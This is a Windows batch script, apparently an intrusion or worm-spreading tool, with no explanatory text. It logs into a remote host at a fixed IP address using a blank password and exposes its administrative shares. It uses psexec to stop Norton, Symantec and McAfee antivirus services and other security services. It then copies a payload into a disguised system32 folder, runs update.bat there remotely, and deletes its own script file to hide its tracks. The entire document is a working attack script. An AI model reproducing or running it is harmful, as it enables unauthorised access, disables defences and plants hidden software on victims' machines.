   net use p: /delete
   net use \\218.236.21.94 /USER:turtlmac
   psexec \\218.236.21.94 -u turtlmac -p "" net share C$
   psexec \\218.236.21.94 -u turtlmac -p "" net share ADMIN$
   psexec \\218.236.21.94 -u turtlmac -p "" net share IPC$
   net use p: \\218.236.21.94\C$
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "Norton AntiVirus Server"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "Norton AntiVirus Auto Protect Service"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "Norton AntiVirus Client"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "Symantec AntiVirus Client"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "Security Accounts Manager"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "McShield"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "IPSEC Policy Agent"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "DefWatch"
   psexec \\218.236.21.94 -u turtlmac -p "" net stop "TCP/IP NetBIOS Helper Service"
   mkdir p:\winnt\system32\rmtcfg2
   copy copy\* p:\winnt\system32\rmtcfg2
   mkdir p:\winnt\system32\rmtcfg2
   mkdir p:\winnt\system32\rmtcfg2\dat
   mkdir p:\winnt\system32\rmtcfg2\log
   mkdir p:\winnt\system32\rmtcfg2\plugin
   copy C:\WINNT\system32\rmtcfg2\* p:\winnt\system32\rmtcfg2
   copy plugin\* p:\winnt\system32\rmtcfg2\plugin
   copy dat\* p:\winnt\system32\rmtcfg2\dat
   psexec \\218.236.21.94 -u turtlmac -p "" -d c:\winnt\system32\rmtcfg2\update.bat
   net use p: /delete
   net use \\218.236.21.94 /delete
   del runme363734.bat
